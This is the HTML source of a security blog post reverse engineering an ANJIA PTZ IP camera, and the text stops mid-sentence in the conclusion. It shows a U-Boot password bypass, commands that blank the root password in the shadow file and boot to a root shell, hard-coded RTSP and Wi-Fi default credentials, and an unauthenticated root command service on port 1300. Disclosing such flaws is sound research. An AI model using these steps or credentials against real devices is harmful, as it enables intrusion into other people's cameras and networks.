@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Reverse Engineering an ANJIA AJ-L73PA1250 PTZ IP Camera | Messing with Code So You Don’t Have To</title>
+<meta name="keywords" content="hardware, reverse-engineering, uart, ingenic-t31, root-access">
+<meta name="description" content="A technical reverse-engineering analysis of a low-cost PTZ IP camera, including UART access, firmware extraction, and undocumented backdoors.">
+<meta name="author" content="Zachary Mitev">
+<link rel="canonical" href="http://localhost:1313/posts/china-camera-full-teardown/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/china-camera-full-teardown/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://localhost:1313/posts/china-camera-full-teardown/">
+  <meta property="og:site_name" content="Messing with Code So You Don’t Have To">
+  <meta property="og:title" content="Reverse Engineering an ANJIA AJ-L73PA1250 PTZ IP Camera">
+  <meta property="og:description" content="A technical reverse-engineering analysis of a low-cost PTZ IP camera, including UART access, firmware extraction, and undocumented backdoors.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-13T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-13T00:00:00+00:00">
+    <meta property="article:tag" content="Hardware">
+    <meta property="article:tag" content="Reverse-Engineering">
+    <meta property="article:tag" content="Uart">
+    <meta property="article:tag" content="Ingenic-T31">
+    <meta property="article:tag" content="Root-Access">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Reverse Engineering an ANJIA AJ-L73PA1250 PTZ IP Camera">
+<meta name="twitter:description" content="A technical reverse-engineering analysis of a low-cost PTZ IP camera, including UART access, firmware extraction, and undocumented backdoors.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Reverse Engineering an ANJIA AJ-L73PA1250 PTZ IP Camera",
+      "item": "http://localhost:1313/posts/china-camera-full-teardown/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Reverse Engineering an ANJIA AJ-L73PA1250 PTZ IP Camera",
+  "name": "Reverse Engineering an ANJIA AJ-L73PA1250 PTZ IP Camera",
+  "description": "A technical reverse-engineering analysis of a low-cost PTZ IP camera, including UART access, firmware extraction, and undocumented backdoors.",
+  "keywords": [
+    "hardware", "reverse-engineering", "uart", "ingenic-t31", "root-access"
+  ],
+  "articleBody": "Introduction and Trigger At around 1:30 AM, I received a notification from my home monitoring system indicating that something was scanning my network. The source IP belonged to one of my cheap PTZ cameras.\nThe cameras are isolated on a separate network, but I wanted to understand what was happening, so I decided to reverse engineer both the camera and the Android app to find out what was really going on.\nThe unit discussed in this write-up is the ANJIA AJ-L73PA1250 PTZ. It’s a low-cost PTZ camera, and I see devices like this installed in many places — small coffee shops, storefronts, and mounted on the outside of buildings.\nBut what is the real cost of using a cheap PTZ camera, even one that claims to offer features like person detection?\nFigure 1: Camera exterior and model label (placeholder).\nInitial Recon I started with the camera itself since the alert came from it. An nmap scan showed Telnet and RTSP on port 8554 (default RTSP is 554), plus ONVIF ports. Telnet was the most interesting because it exposes the OS directly. I attempted brute force on Telnet and RTSP but without success…\nHost is up (0.0030s latency). Not shown: 65528 closed tcp ports (reset) PORT STATE SERVICE VERSION 23/tcp open telnet 843/tcp open unknown 1300/tcp open h323hostcallsc? 6688/tcp open tcpwrapped 8554/tcp open rtsp 8699/tcp open arcserve ARCserve Discovery 16668/tcp open unknown So many ports for one tiny camera right?\nHardware Access I tore down the camera and found a small PCB with three suspicious pins at the edge of the board. They measured 3.3V, which usually indicates a UART debugging interface.\nFigure 2 and 3: UART header pins on the main PCB (placeholder).\nRaw UART Console Captured with picocom at 112500 baud. I am including the full raw log for reference.\nShow full UART boot log picocom -b 112500 /dev/ttyUSB0 picocom v3.1 port is : /dev/ttyUSB0 flowcontrol : none baudrate is : 112500 parity is : none databits are : 8 stopbits are : 1 escape is : C-a local echo is : no noinit is : no noreset is : no hangup is : no nolock is : no send_cmd is : sz -vv receive_cmd is : rz -vv -E imap is : omap is : emap is : crcrlf,delbs, logfile is : none initstring : none exit_after is : not set exit is : no U-Boot 2010.06-dirty (Aug 30 2022 - 17:53:20) DRAM: 64 MiB SF: Got idcode c2 20 17 c2 20 env_pinctrl: \"GPIO0,GPIO1,GPIO2,GPIO3,GPIO30,GPIO28,GPIO29,GPIO31,GPIO32,GPIO37,GPIO38,GPIO39,GPIO40,GPIO41,GPIO42,GPIO43,GPIO44\" Net: FH EMAC Press 'E' to stop autoboot: 0 SF: Got idcode c2 20 17 c2 20 verify flash image OK load kernel 0x00060000(0x00240000) to 0xa1000000 ## Booting kernel from Legacy Image at a1000000 ... Image Name: Linux-4.9.129 Image Type: ARM Linux Kernel Image (uncompressed) Data Size: 2250928 Bytes = 2.1 MiB Load Address: a0008000 Entry Point: a0008000 Verifying Checksum ... OK Loading Kernel Image ... OK OK prepare atags Starting kernel ... starting pid 90, tty '': '/etc/init.d/rcS' E[RCS]: /etc/init.d/S01udev Starting udev: EEE[ OK ] [RCS]: /etc/init.d/S02init_rootfs init_rootfs begin Etarget=release /bin/mount -t squashfs /dev/mtdblock6 /app /bin/mount -t jffs2 /dev/mtdblock4 /app/userdata /bin/mount -t jffs2 /dev/mtdblock5 /app/res init_rootfs OK [RCS]: /etc/init.d/S03network E[RCS]: /etc/init.d/S04app ECurrent prodid: PQEW4-01 EEE============================================= Kernel version : Linux 4.9.129 Kernel date : 2022-08-31 16:03:06 SDK version : bsp:FH885XV210_IPC_V1.0.0_20210928 sdk:FH885XV200_IPC_V1.1.0_20210716 patch:FH885XV200_IPC_V1.1.0.FP29_20220802 EModel name : AJ-L73PA1250 FW version : v220901.1359 Build date : 2022-09-01T14:02 Chip name : FH8852V210 ============================================= EFri Jul 1 00:00:00 UTC 2022 Evmm with 24064K EEEEdev_id=RTL8188FU EEEEEEEsensor_probe(v3.1): auto probe sensor gc3003_mipi EEEEEEEEEEEEopen local socket OK: @jdc_server open local socket OK: @jsh_server srv_system[/app/wifi_mode.sh sta start] exec cmd: \"/app/wifi_mode.sh sta start\" EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE[ 6.721223] libphy: linkdown . reset phy... EEEEEEEEEEEENetwork config wlan0 EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEROM: Use nor flash. ROM: Init DDR..Training done. ROM: Ok ---------------------------- U-Boot 2010.06-dirty (Aug 30 2022 - 17:53:20) DRAM: 64 MiB SF: Got idcode c2 20 17 c2 20 env_pinctrl: \"GPIO0,GPIO1,GPIO2,GPIO3,GPIO30,GPIO28,GPIO29,GPIO31,GPIO32,GPIO37,GPIO38,GPIO39,GPIO40,GPIO41,GPIO42,GPIO43,GPIO44\" Net: FH EMAC Press 'E' to stop autoboot: 00 MMC: FH_MMC: 0 MMC FLASH INIT: No card on slot0! ### Please input uboot password: ### ***************************************************************************************************** ### Please input uboot password: ### ### Please input uboot password: ### ### Please input uboot password: ### ### Please input uboot password: ### I connected a UART interface to my laptop and was able to access a live serial console. During boot, the camera prompted for a username and password. I tried the most common default credentials, but none of them worked. While watching the boot process after powering up the camera, I noticed a message that said: “Press ‘E’ to stop auto boot.”\nPressing it dropped me into a U-Boot prompt, but it still required a password — one I couldn’t guess. I tried many of the most common U-Boot and IoT passwords, but without success.\nSo there had to be another way… right?\n~#picocom -b 112500 /dev/ttyUSB0 U-Boot 2010.06-dirty (Aug 30 2022 - 17:53:20) DRAM: 64 MiB SF: Got idcode c2 20 17 c2 20 env_pinctrl: \"GPIO0,GPIO1,GPIO2,GPIO3,GPIO30,GPIO28,GPIO29,GPIO31,GPIO32,GPIO37,GPIO38,GPIO39,GPIO40,GPIO41,GPIO42,GPIO43,GPIO44\" Net: FH EMAC Press 'E' to stop autoboot: 00 MMC: FH_MMC: 0 MMC FLASH INIT: No card on slot0! ### Please input uboot password: ### ****** ### Please input uboot password: ### ******** ### Please input uboot password: ### Firmware Extraction and U-Boot Bypass To get a closer look, I extracted firmware from the flash chip. The chip is an MX25L6433F, and I used a CH341A mini programmer with flashrom under Linux. After dumping the flash, I used binwalk to extract the firmware. This was simple part.\nsudo flashrom -p ch341a_spi -c \"MX25L6406E/MX25L6408E\" -r backup.bin The first files that caught my attention were the shadow file and an environment configuration file containing a ubootpwd string with a SHA-256 hash. I tried cracking it using popular wordlists, as well as mask attacks up to 8 characters, but failed.\nThe same thing happened with the shadow hash. I even found other people online asking about this shadow file — with no answers. It was clear the password wasn’t something like admin123, so I set that aside.\nAt this point, cracking seemed impossible, so I switched approaches. Instead of cracking the U-Boot password, I broke it. (:\nI used a hex editor to invalidate the password variable by changing ubootpwd to ubooOpwd, then flashed the modified image. That worked, but the camera printed:\nWarning - bad CRC, using default environment\nU-Boot verifies the environment using a CRC32 checksum, and it was now failing, so it loaded the default environment hard-coded into the chip. That was a problem.\nAfter some searching and experimentation, I recalculated the CRC32 using the chip’s memory configuration and fixed the checksum so the modified environment would load correctly.\nOnce I got into U-Boot, I immediately pressed “E” and boom we got the U-boot unlocked. So just used printenv to inspect the environment. To get a shell we need to add rdinit=/bin/sh to the boot args and ran the normal boot command:\nsetenv bootargs_run set bootargs console=ttyS0,115200 mem=40M mtdparts=spi0.0:64k(bootstrap),64k(uboot-env),256k(uboot),2688k(kernel),512k(data),-(app) rdinit=/bin/sh run bootcmd The camera booted and I got a root shell, but because I overwrote the environment it did not fully load user data. So I need to mount userdata manually:\nmkdir -p /app/userdata mount -t jffs2 /dev/mtdblock4 /app/userdata There was no shadow file in /app/userdata, only the root filesystem shadow, and it’s hash did not match the one from firmware extraction. I cracked that hash and got root123, but Telnet still did not work. I created an empty /app/userdata/shadow, synced, and rebooted:\necho 'root::18622:0:99999:7:::' \u003e /app/userdata/shadow sync After reboot, Telnet accepted root with no password. With a live shell, I did deeper analysis. I copied /app/userdata to the SD card and moved it to my PC to continue with IDA analysis and later will do some MITM capture, and Android app inspection.\nRuntime Process and Network State Once Telnet was available, I captured process and network state to understand what was actually running.\nKey observations:\napollo hosts RTSP/ONVIF and the cloud logic; dev_ctrl, noodles, inetd, and telnetd are active alongside it. Listening ports include 6688 (ONVIF), 8554 (RTSP), 23 (Telnet), 8699/16668, and 843/1300. There is an active outbound TCP link to 34.40.41.193:25515 while the device is online. Show process list (ps) [/app]# ps T PID USER VSZ STAT COMMAND 1 root 1380 S init 2 root 0 SW [kthreadd] 3 root 0 SW [ksoftirqd/0] 4 root 0 SW [kworker/0:0] 5 root 0 SW\u003c [kworker/0:0H] 6 root 0 SW [kworker/u2:0] 7 root 0 SW\u003c [lru-add-drain] 8 root 0 SW [oom_reaper] 9 root 0 SW\u003c [writeback] 10 root 0 SW [kcompactd0] 11 root 0 SW\u003c [crypto] 12 root 0 SW\u003c [bioset] 13 root 0 SW\u003c [kblockd] 14 root 0 SW\u003c [cfg80211] 15 root 0 SW [kworker/0:1] 16 root 0 SW\u003c [rpciod] 17 root 0 SW\u003c [xprtiod] 18 root 0 SW [kswapd0] 19 root 0 SW\u003c [nfsiod] 33 root 0 SW [spi0] 34 root 0 SW\u003c [bioset] 35 root 0 SW\u003c [bioset] 36 root 0 SW\u003c [bioset] 37 root 0 SW\u003c [bioset] 38 root 0 SW\u003c [bioset] 39 root 0 SW\u003c [bioset] 40 root 0 SW\u003c [bioset] 41 root 0 SW [spi1] 42 root 0 SW [kworker/u2:1] 75 root 0 SW\u003c [fh_aes.0] 89 root 0 SW\u003c [ipv6_addrconf] 90 root 0 SW [kworker/0:2] 100 root 752 S \u003c /sbin/udevd -d 103 root 0 SW\u003c [bioset] 104 root 0 SW [mmcqd/0] 218 root 0 SW\u003c [kworker/0:1H] 221 root 0 SWN [jffs2_gcd_mtd4] 223 root 0 SWN [jffs2_gcd_mtd5] 379 root 0 DW [xbus-rx] 481 root 1736 S {main} /app/abin/dev_ctrl 490 root 1736 S {ut_jcmd_server_} /app/abin/dev_ctrl 491 root 1736 S {ut_jcmd_server_} /app/abin/dev_ctrl 492 root 1736 S {ut_dev_event_pr} /app/abin/dev_ctrl 493 root 1736 S {net_ctrl_proc} /app/abin/dev_ctrl 494 root 1736 S {sd_ctrl_proc} /app/abin/dev_ctrl 530 root 97564 S {main} ./apollo 542 root 97564 S {onvif_timer} ./apollo 553 root 97564 S {fake_rtc_thread} ./apollo 554 root 97564 S {ap_alarm_proc} ./apollo 577 root 97564 S {get_host_info_t} ./apollo 588 root 97564 S {_db_save_thread} ./apollo 590 root 97564 S {ntpcli_thread} ./apollo 591 root 97564 S {apl_timer_watch} ./apollo 603 root 97564 S {video_thread_pr} ./apollo 604 root 97564 S {isp_thread_proc} ./apollo 605 root 97564 S {service_event_u} ./apollo 625 root 97564 D {audio_thread_pr} ./apollo 628 root 97564 S {apl_timer_watch} ./apollo 629 root 97564 S {_apl_record_sdc} ./apollo 630 root 97564 S {snapshot_monito} ./apollo 631 root 97564 S {apl_netctrl_thr} ./apollo 632 root 97564 S {audio_output_pr} ./apollo 633 root 97564 S {audio_player_pr} ./apollo 634 root 97564 S {ap_alarm_proc} ./apollo 635 root 97564 S {ut_msgq_thread} ./apollo 639 root 97564 S {ut_msgq_thread} ./apollo 640 root 97564 S {_apl_ptz_timer_} ./apollo 643 root 97564 S {service_event_u} ./apollo 644 root 97564 S {service_event_u} ./apollo 645 root 97564 S {event_thread2_p} ./apollo 656 root 97564 S {_apl_ptz_timer_} ./apollo 657 root 97564 S {apl_monitor_tim} ./apollo 658 root 97564 S {apl_monitor_che} ./apollo 659 root 97564 S {apl_monitor_drv} ./apollo 660 root 97564 S {ut_jcmd_server_} ./apollo 661 root 97564 S {http_rx_thread} ./apollo 662 root 97564 S {onvif_timer} ./apollo 663 root 97564 S {onvif_discovery} ./apollo 664 root 97564 S {rtsp_listen_thr} ./apollo 665 root 97564 S {ut_jcmd_server_} ./apollo 666 root 97564 S {ut_net_listen_p} ./apollo 677 root 97564 S {Cos_InetMgr} ./apollo 689 root 97564 S {HttpClientThrea} ./apollo 702 root 97564 S {zj_live_thread_} ./apollo 703 root 97564 S {zj_audio_thread} ./apollo 704 root 97564 S {zj_ptz_thread} ./apollo 705 root 97564 S {zj_sdchk_thread} ./apollo 707 root 97564 S {cfg_task} ./apollo 708 root 97564 S {TrasBaseProcThr} ./apollo 709 root 97564 S {TrasBaseSendThr} ./apollo 710 root 97564 S {TunnelRecvThrea} ./apollo 711 root 97564 S {LOGCOLLECT_TASK} ./apollo 712 root 97564 S {CloudMng} ./apollo 713 root 97564 S {cloud res} ./apollo 714 root 97564 S {CloudChan} ./apollo 715 root 97564 S {CloudExternChan} ./apollo 716 root 97564 S {AIIOT_TASK} ./apollo 717 root 97564 S {MSGCT_TASK} ./apollo 718 root 97564 S {cmd_task} ./apollo 719 root 97564 S {RF_TASK} ./apollo 720 root 97564 S {localio_task} ./apollo 721 root 97564 S {FileProc_SendTa} ./apollo 722 root 97564 S {FileProc_RecvTa} ./apollo 729 root 97564 S {ap_netstat_thre} ./apollo 730 root 97564 S {ap_ircut_switch} ./apollo 533 root 0 SW [RTW_CMD_THREAD] 539 root 1948 S /app/bin/wpa_supplicant -Dnl80211 -P/var/lock/wpa_su 572 root 1596 S noodles 582 root 1596 S {policy_thread} noodles 583 root 1596 S {multicast_threa} noodles 573 root 1372 S /sbin/inetd -f -e /etc/inetd.conf 575 root 1380 S init 600 root 0 SW [jpeg_kick] 601 root 0 SW [vpu_task] 602 root 0 SW [hhe_manage] 627 root 1384 S udhcpc -p /var/lock/udhcpc_wlan0.pid -t 30 -T 3 -b - 762 root 1372 S /sbin/telnetd -w10 763 root 1388 S -sh 774 root 0 SW [kworker/u2:2] 791 root 1372 R ps T Show network sockets (netstat) [/]# netstat -alpt Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:6688 0.0.0.0:* LISTEN 531/apollo tcp 0 0 0.0.0.0:8554 0.0.0.0:* LISTEN 531/apollo tcp 0 0 0.0.0.0:843 0.0.0.0:* LISTEN 573/noodles tcp 0 0 0.0.0.0:1300 0.0.0.0:* LISTEN 573/noodles tcp 0 0 0.0.0.0:23 0.0.0.0:* LISTEN 574/inetd tcp 0 0 0.0.0.0:8699 0.0.0.0:* LISTEN 531/apollo tcp 0 0 0.0.0.0:16668 0.0.0.0:* LISTEN 531/apollo tcp 0 0 192.168.68.65:38534 193.41.40.34.bc.googleusercontent.com:25515 ESTABLISHED 531/apollo udp 0 0 0.0.0.0:16658 0.0.0.0:* 531/apollo udp 0 0 0.0.0.0:3702 0.0.0.0:* 531/apollo udp 0 0 0.0.0.0:5012 0.0.0.0:* 573/noodles Active UNIX domain sockets (servers and established) Proto RefCnt Flags Type State I-Node PID/Program name Path unix 2 [ ACC ] STREAM LISTENING 2117 482/dev_ctrl @jdc_server unix 2 [ ACC ] STREAM LISTENING 2348 531/apollo @sd_event unix 2 [ ACC ] STREAM LISTENING 2355 531/apollo @jap_server unix 2 [ ACC ] STREAM LISTENING 2118 482/dev_ctrl @jsh_server unix 2 [ ] DGRAM 812 100/udevd @/org/kernel/udev/udevd unix 2 [ ] DGRAM 2221 540/wpa_supplicant /var/run/wpa_supplicant/wlan0 Initial firmware extraction and strings. After getting a working shell, I moved on to firmware extraction and static analysis of the extracted root filesystem and binaries.\nThe most interesting targets were the running binaries. They handled cloud communication and listened on local ports — specifically apollo and noodles.\nI started with apollo, which is responsible for cloud connectivity and services such as RTSP and ONVIF. I fired up IDA and began digging…\nTL;DR: both main applications contain backdoors. One affects RTSP, and the other allows execution of system commands as root — without any authentication.\nNow all that remained was figuring out how to enable them and make them work for us.\nSome key findings that I found was:\nHard-coded RTSP strings include user=admin_password=tlJwpbo6 and stream variants(apollo app). Default services in config enable Telnet, RTSP, and ONVIF; the web UI is disabled. Default ports listed in myinfo.sh are RTSP 8554, ONVIF 6688. Factory AP defaults show SSID prefix Care-AP and key pass as Aa12345678. Noodles act like a Backdoor Service (executes commands as root). Apollo - Show IDA strings sweep for \"admin\" .rodata:002AE1A9 0000000E C Administrator .rodata:002B169C 0000001D C user=admin_password=tlJwpbo6 .rodata:002B6904 00000006 C admin .rodata:002BF1F4 00000006 C admin .rodata:002C076B 00000006 C admin .data:00342614 00000040 C user=admin_password=tlJwpbo6_channel=1_stream=0.sdp?real_stream .data:00342654 00000040 C user=admin_password=tlJwpbo6_channel=1_stream=1.sdp?real_stream Show rootfs scan highlights Interesting config\nTelnet enabled plus ONVIF/RTSP enabled in app.cfg Default service ports (http 80 / https 443 / rtsp 8554 / onvif 6688) in myinfo.sh overrides stored in ipc.db. SD card config injection paths for env and Wi-Fi in app_config.sh TFTP upgrade flow in iu.sh server IP in uboot_env Custom binaries and scripts\nMain app/control tooling in /squashfs-root/abin/apollo, /squashfs-root/abin/dev_ctrl, /squashfs-root/abin/net_cfg, /squashfs-root/abin/noodles, /squashfs-root/abin/playaudio. Firmware/env tooling in /squashfs-root/bin/img_up, /squashfs-root/bin/apenv, /squashfs-root/bin/fw_printenv, /squashfs-root/bin/get_cfg, /squashfs-root/bin/db_get. Wi-Fi test/control scripts in /cli and /rf. Likely credential stores not yet extracted\nDefault DB used to seed admin info: ipc_def.db Show UPX detection and unpacking notes The apollo binary was UPX-packed. file apollo (or binwalk) reports “UPX compressed”\nUnpacking was:\nupx -d apollo -o apollo.unpacked After unpacking, code and strings were readable and decompiling worked normally. file apollo.unpacked shows a regular ELF without the UPX note.\nShow apollo highlights and observations from IDA Quick config and value extracts\nroot:z1Y********** (DES hash from shadow, system root account). telnetd=yes (from /app.cfg, telnet default enabled). AP_ssid_prefix=Care-AP AP_key=Aa12345678 (default AP password noted in ap_mode.cfg context). App expects file in /home/dis_onvif_auth to enable hard-coded credentials for RTSP. Enable RTSP service by touching /home/dis_onvif_auth file\nShow noodles app highlights and observations from IDA Highlights\nTarget binary: /squashfs-root/abin/noodles (static ARM ELF). Main entry starts an unauthenticated TCP server on port 1300 and dispatches XML-like commands. Key handlers (all reachable without auth): → cmd_system: runs arbitrary shell. → cmd_system_ex: runs a shell command and streams stdout (buggy 1024-byte ACK read). , , , : full file transfer and upgrade paths. , , , : write/read MAC, serial, and env keys; persist to /home/* and env. : download a binary, chmod +x, execute. Auxiliary listeners/threads: Flash policy server (ports 843 → fallback 8843) sends permissive cross-domain XML. UDP multicast responder on 224.0.0.111/ports 5012/7654, advertises device info and executes if target IP/MAC match. No authentication or source filtering anywhere; all handlers run as root. Noodles backdoor\nFirmware Findings (Deep Pass) This section captures a deeper pass over the firmware and binary behavior.\nKey takeaways:\nRoot hash z1Y********** is present; Telnet defaults are enabled; Wi-Fi STA creds live at runtime. Telnet/FTP toggles are gated by config DB keys, not just app.cfg. The license flow uses plaintext HTTP and writes QR content to /home/qrcode. Cloud traffic uses a custom encrypted message layer over TCP, with separate NAT/P2P flows. No obvious shell backdoor was found in cloud handlers. Show full firmware findings and function notes **System credentials and defaults** - System credential: `root:z1Y**********` (DES hash) in `shadow` and `squashfs-root/shadow`. No cleartext RTSP/ONVIF creds found. - Telnet default in config: `telnetd=yes` in `app.cfg` (and prodid variants). - FTP defaults: no `ftpd_enable` in `app.cfg` - Wi-Fi STA credentials are not in the readonly dump. They live at runtime in `ifcfg.wlan0` and `wpa_supplicant.conf`. Boot Flow, Config Storage, and Device/Cloud Profile This block captures the boot flow and on-disk configuration sources I mapped next.\nSummary:\nBoot chain is app_init.sh -\u003e start.sh -\u003e abin/apollo, with modules and SD update paths early in boot. ipc.db and systemcfg.db store runtime config and identity; app.cfg and board.cfg describe features. Defaults include AP mode Care-AP with key Aa12345678, RTSP/ONVIF enabled, and web UI disabled. Cloud config points to svr.smartcloudcon.com with specific IDs, link servers, and tokens. Hardware profile shows FH8852V2X0, RTL8188FU/SSV6155P, PTZ, audio I/O, multiple sensors, and firmware v220901.1359. Show full boot and config notes Boot flow app_init.sh syncs U-Boot/apenv, mounts SD, loads kernel modules (modules.sh), copies userdata/shadow into /etc, then start.sh launches abin/apollo (UPX-unpacked copy included) and optional cld_upd/andlink before doing NTP sync.\nConfig storage ipc.db is the primary settings DB seeded/reset by db_init.sh if revisions differ; JSON configs in *.db hold cloud/IOT settings; systemcfg.db keeps identity/SignAddr; app.cfg (cloud/onvif/rtsp/telnet flags) and board.cfg (PTZ GPIO/PWM, audio, IR) describe capabilities.\nCredentials in clear userdata/shadow sets root with no password (default hash in /squashfs-root/shadow is root:z1Y********** but overwritten at boot); Wi-Fi STA creds in ifcfg.wlan0 (MyTestWifi01 / Mypassword1234); provisioning AP in ap_mode.cfg uses SSID Care-AP, auth=none, key Aa12345678. IDA strings noted in notes.txt/apollo_report.txt show a hardcoded RTSP template user=admin_password=tlJwpbo6.\nServices/protocols app.cfg enables cloud_enable, cloud_zj, rtsp=yes (audio on), onvif=yes, telnetd=yes, web=no. Default ports from myinfo.sh are HTTP 80, HTTPS 443, RTSP 8554, ONVIF 6688. Wi-Fi control uses wifi_mode.sh (wpa_supplicant/hostapd). NTP hits cn.ntp.org.cn and time.windows.com. PTZ is PWM-driven (board.cfg), with video pipeline tuned in sysinfo/setting.\nCloud and endpoints systemcfg.db points to svr.smartcloudcon.com with AppID 1657353*********, CompanyID 0000213*********, device DID 120001*********. corecfg.db sets linkIpv4 34.40.41.193, linkPort 25515, linkSrvid CPLink:20001-10-DE-20250911115034.449, LinkEncKey 132ded*********, LinkEncLoad dd06dc6*********. groupcfg.db uses Ipv4 130.162.37.6, Port 25006, ConnToken 10:BG:af2f5*********, OwnerToken 16000102c09471e*********. Strings in apollo_report.txt also reference cloud.ygtek.cn.\nHardware/profile userdata/hw_info and prodid/PQEW4-01/config/prod_info show Fullhan FH8852V2X0 SoC, Wi-Fi RTL8188FU/SSV6155P, PTZ present, audio in/out, sensors sc3338_mipi/gc4653/gc3003, firmware fw_ver v220901.1359, timezone set to EET (devcfg.db).\nMITM Setup for Camera Traffic I ran a MITM attack from my laptop over a LAN RJ45 connection, using the laptop as a proxy through eth0.\nI also set up Burp Suite as a MITM proxy, but no HTTP or HTTPS traffic — with or without TLS — was observed during the actual communication.\nShow MITM setup commands #Start DNS and DHCP. sudo dnsmasq -i enxc8a362b69fba \\ --dhcp-range=192.168.10.50,192.168.10.100,12h \\ --dhcp-option=option:router,192.168.10.1 \\ --dhcp-option=option:dns-server,8.8.8.8 \\ -d #Enable routing. sudo sysctl -w net.ipv4.ip_forward=1 #Basic NAT so the camera can reach the web... sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i enxc8a362b69fba -o wlan0 -j ACCEPT ARP broadcasts on /24 at boot: In these captures also, the camera does DHCP and sends SSDP M-SEARCH; ARP broadcasts appear during the same startup window. Network traffic observations - On boot, camera opens TCP to 34.40.41.193 (line 25515) and sends only a small JSON control message; no user data observed. Example frame 1 payload: `{\"METHOD\":\"0000\",\"SEQID\":\"3985029\"}`. No private info beyond a sequence ID. - P2P bootstrap over UDP to 158.101.162.17 / 130.162.37.6. Messages are cleartext and include the camera's public IP/port. Example: frame 1002 `{\"METHOD\":\"201A\",\"SEQID\":\"2109\",\"BODY\":{\"SvrToken\":\"\"}}` from 192.168.10.69 (line 7171) to 130.162.37.6 (line 30194); frame 1005 reply `{\"METHOD\":\"201B\",\"CODE\":\"0\",\"BODY\":{\"NatIP\":\"151.237.67.245\",\"Port\":\"7171\"}}`. - After NAT bootstrap, large UDP between camera 192.168.10.69 (line 7171) and phone 192.168.68.78 (line 7195); payload not decrypted in current capture. - App TLS sessions to `ims.smartcloudcon.com` observed, but payload encrypted; plain HTTP requests go to MOB/analytics (`cfgc.zztfly.com`, `api-share.mob.com`, `errc.zztfly.com`), not directly tied to camera state. App and Camera Data Collection Findings I also reversed the Android app and captured traffic from both the device and the application itself.\nBased on Frida HTTP logs and API dumps, here’s what the app and the camera appear to collect and transmit.\nSummary:\nPersistent user IDs and session tokens are attached to most app calls. The camera DID is used as deviceId in cloud and purchase flows. Analytics events and app usage telemetry go to beimei-loggw.smartcloudcon.com. Ad and promo endpoints collect device/app metadata and return ad inventory. Cloud package and purchase endpoints expose product catalogs tied to the device. Account linking endpoints exist for Alexa/GHA integrations. Show full data collection breakdown Telemetry/analytics\nEvent tracking to beimei-loggw.smartcloudcon.com/loggw/app/eventTrack/ Captures app usage flow and device interactions (enter live view, playback, exit). Permissions: camera, mic, fine/coarse/NEARBY_WIFI_DEVICES, storage, overlay (SYSTEM_ALERT_WINDOW), notifications, ad IDs, billing/licensing, boot, kill background. Exported components: deep link hm://app.smartcloudcon.com/ (CareMainActivity), WXPay, GIF push activity, push services/receivers for Huawei/OPPO/FCM/Xiaomi/Vivo/GeTui, file providers. Endpoints/domains: svr.smartcloudcon.com, exsvr.smartcloudcon.com, websvr.smartcloudcon.com, exwebsvr.smartcloudcon.com, console console.smartcloudcon.com, logs ims.smartcloudcon.com, test hosts testweb.smartcloudcon.com, testsvr.smartcloudcon.com, legacy IP hints http://139.159.243.73:8099/9003, deep link app.smartcloudcon.com. Other hosts: im-hw.7x24cc.com, im5fa212f.7x24cc.com, globalh5.crosssim.com, cfgc.zztfly.com, errc.zztfly.com, api-share.mob.com, hmstatic-1311597033.cos.ap-nanjing.myqcloud.com. Ads and personalization\nAd requests to exsvr.smartcloudcon.com/carewebin/store/getadlist/v2 Cloud packages/purchases\nCloud package catalogs (store/promotegoods, goodscollection) fetched with uid, deviceId, and app info. Contains product IDs (Google Play SKUs), prices, recording templates (e.g., days of storage, continuous vs event-based), and eligibility flags. Purchase flows (prepaidorder, queryLatestUnpaidOrder) include uid, utoken, deviceId, goodsId, payType, serviceid, uniqueid; tests returned errors. Menus/feature links\nMenus include links to cloud packages, voice assistant integration, no ads, AI alarm, offline monitor, payment pages, pulled via GetAppMenus. Conclusion In the end, we achieved a fully working exploit. If an attacker has LAN access to the device, it can be exploited very easily due to the multiple backdoors embedded in the camera.\nA possible next step for an attacker would be to compile additional tools for the device — such as Responder, NetExec, or even an SSH server — and use it as a pivot point. But that’s a topic for another discussion.\nWe also recovered the Wi-Fi credentials in plain text. This means that even with only LAN access, it’s possible to extract the Wi-Fi password if the camera is connected wirelessly.\nBased on all the information above, I can conclude that my 